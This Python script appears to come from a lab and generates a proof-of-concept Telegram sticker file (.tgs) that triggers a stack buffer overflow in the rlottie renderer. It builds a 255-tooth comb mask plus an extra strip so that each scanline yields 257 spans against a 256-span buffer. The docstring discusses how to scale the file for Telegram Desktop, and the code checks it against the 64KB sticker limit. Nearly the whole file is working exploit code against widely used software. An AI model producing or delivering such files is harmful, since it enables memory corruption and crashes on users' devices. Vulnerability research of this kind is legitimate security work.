#!/usr/bin/env python3
"""
lab1/gen_poc_v6.py
Generate a rlottie stack-overflow PoC using comb + 1 extra strip.

Strategy: 3 masks total (fast processing, only 2 XOR operations)
  Mask 0 (Add):        solid rectangle covering full canvas
  Mask 1 (Difference): 255-tooth comb polygon (1022 vertices, under 1024 limit)
                        → produces exactly 256 spans per scanline (at temp capacity)
  Mask 2 (Difference): single thin strip at a position that splits one existing span
                        → produces 257 spans → overflow by 1 span (8 bytes)

The comb teeth and strip must be sized for the TARGET render resolution.
For Telegram Desktop: stickers render at ~224×224 for a 512×512 canvas.
At 224px render: scale = 224/512 = 0.4375. Need teeth ≥ 1/0.4375 ≈ 2.3 canvas units.

With tooth_width=3 canvas units, gap_width=3 canvas units (period=6):
  Max teeth = 512 / 6 ≈ 85 teeth → only 85 spans. Not enough.

Alternative: use larger scale transform. With 4× layer scale:
  Effective render scale = 4 × 224/512 = 1.75
  Tooth = 1 canvas unit → 1.75 render pixels → resolves as 1-2px span
  Gap = 1 canvas unit → 1.75 render pixels → resolves as 1-2px gap

  With 255 teeth over 510 canvas units, scaled 4× → 2040 effective pixels.
  At 224px render: 2040 × 224/512 ≈ 893 effective pixels → 255 teeth produce
  255 spans + gaps + leading/trailing. Could produce 256+ spans.

Actually, the simpler approach: render at a fixed size where the overflow triggers,
and demonstrate the exploit at that size. Telegram's render size is configurable
(DPI scaling, preview vs. full size, etc.), and the bug exists regardless.

This script generates a PoC that overflows at 512×512 rendering (1× canvas scale)
using a comb with pixel-sized teeth (1 canvas unit = 1 pixel at 512×512).
"""

import argparse
import gzip
import io
import json
import sys


def make_rect_path(x0, y0, x1, y1):
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb_path(n_teeth, tooth_w, gap_w, height):
    """Comb polygon: n_teeth teeth of width tooth_w, gap_w between them."""
    H = float(height)
    verts = []
    period = tooth_w + gap_w

    for k in range(n_teeth):
        x_start = k * period
        x_tooth_end = x_start + tooth_w
        x_gap_end = x_start + period

        verts.append([x_start, 0.0])
        verts.append([x_tooth_end, 0.0])
        verts.append([x_tooth_end, H])
        verts.append([x_gap_end, H])

    # Close: bottom-right to bottom-left
    verts.append([n_teeth * period, H])
    verts.append([0.0, H])

    n = len(verts)
    return {"i": [[0, 0]] * n, "o": [[0, 0]] * n, "v": verts, "c": True}


def static_path(p):
    return {"a": 0, "k": p}


def static_val(v):
    return {"a": 0, "k": v}


def build_lottie(canvas_w, canvas_h, n_teeth, tooth_w, gap_w, scale_pct, extra_strips):
    """Build Lottie with comb mask + extra strip masks."""
    comb_w = n_teeth * (tooth_w + gap_w)

    identity_ks = {
        "p": static_val([0, 0, 0]),
        "a": static_val([0, 0, 0]),
        "s": static_val([scale_pct, scale_pct, 100]),
        "r": static_val(0),
        "o": static_val(100),
    }

    masks = [
        # Mask 0: Add — solid rect
        {
            "mode": "a",
            "inv": False,
            "pt": static_path(make_rect_path(0, 0, canvas_w, canvas_h)),
            "o": static_val(100),
        },
        # Mask 1: Difference — comb polygon
        {
            "mode": "f",
            "inv": False,
            "pt": static_path(make_comb_path(n_teeth, tooth_w, gap_w, canvas_h)),
            "o": static_val(100),
        },
    ]

    # Extra Difference strips to push span count past 256
    for strip_x in extra_strips:
        masks.append({
            "mode": "f",
            "inv": False,
            "pt": static_path(make_rect_path(strip_x, 0, strip_x + gap_w, canvas_h)),
            "o": static_val(100),
        })

    layer = {
        "ty": 4, "nm": "CombOverflow", "ind": 1,
        "st": 0, "ip": 0, "op": 2, "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": masks,
        "shapes": [{
            "ty": "gr", "nm": "G",
            "it": [
                {"ty": "rc", "nm": "R",
                 "p": static_val([canvas_w / 2, canvas_h / 2]),
                 "s": static_val([canvas_w, canvas_h]),
                 "r": static_val(0)},
                {"ty": "fl", "nm": "F",
                 "c": static_val([1, 0, 0, 1]),
                 "o": static_val(100), "r": 1},
            ],
        }],
    }

    return {
        "v": "5.5.2", "fr": 60, "ip": 0, "op": 2,
        "w": canvas_w, "h": canvas_h,
        "nm": "rlottie-overflow-v6", "ddd": 0,
        "assets": [], "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(description="Generate rlottie overflow PoC v6")
    ap.add_argument("--out", default="poc_v6.tgs")
    ap.add_argument("--json", default="poc_v6.json")
    ap.add_argument("--teeth", type=int, default=255,
                    help="Comb teeth (max 255 for 1022 vertices)")
    ap.add_argument("--tooth-width", type=float, default=1.0)
    ap.add_argument("--gap-width", type=float, default=1.0)
    ap.add_argument("--scale", type=float, default=100.0,
                    help="Layer scale percentage (100=1x, 200=2x)")
    ap.add_argument("--extra-strips", type=int, default=1,
                    help="Number of extra Difference strips after comb")
    ap.add_argument("--width", type=int, default=512)
    ap.add_argument("--height", type=int, default=512)
    args = ap.parse_args()

    n_teeth = args.teeth
    tooth_w = args.tooth_width
    gap_w = args.gap_width
    period = tooth_w + gap_w
    comb_extent = n_teeth * period
    n_verts_comb = n_teeth * 4 + 2

    # Position extra strips in the middle of existing gaps
    # After comb XOR: gaps at [tooth_end, tooth_end+gap_w) are now solid 255
    # Placing a Difference strip IN a gap creates 2 sub-spans from that gap
    # (gap_before_strip + gap_after_strip), net +1 span per strip
    extra_strip_positions = []
    for i in range(args.extra_strips):
        # Place strip in the middle of gap i
        gap_start = i * period + tooth_w
        strip_x = gap_start + gap_w * 0.25  # quarter into the gap
        extra_strip_positions.append(strip_x)

    total_masks = 2 + args.extra_strips
    expected_base_spans = n_teeth + 1  # gaps + trailing
    expected_total_spans = expected_base_spans + args.extra_strips

    print(f"Canvas:           {args.width} x {args.height}")
    print(f"Layer scale:      {args.scale}%")
    print(f"Comb teeth:       {n_teeth} (tooth={tooth_w}, gap={gap_w})")
    print(f"Comb extent:      {comb_extent} canvas units")
    print(f"Comb vertices:    {n_verts_comb} (limit: 1024)")
    print(f"Extra strips:     {args.extra_strips}")
    print(f"Total masks:      {total_masks}")
    print(f"Expected spans:   ~{expected_total_spans} per scanline")
    print(f"Overflow:         ~{max(0, expected_total_spans - 256)} spans")
    print()

    if n_verts_comb > 1024:
        print(f"[FAIL] Comb has {n_verts_comb} vertices > 1024 limit!")
        sys.exit(1)

    lottie = build_lottie(args.width, args.height, n_teeth, tooth_w, gap_w,
                          args.scale, extra_strip_positions)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] JSON:  {args.json}  ({len(json_bytes):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] TGS:   {args.out}  ({len(tgs_bytes):,} bytes)")

    if len(tgs_bytes) > 64 * 1024:
        print(f"\n[FAIL] TGS too large: {len(tgs_bytes)} > 65536")
    else:
        print(f"\n[ok] Passes 64KB limit ({len(tgs_bytes)} < 65536)")


if __name__ == "__main__":
    main()
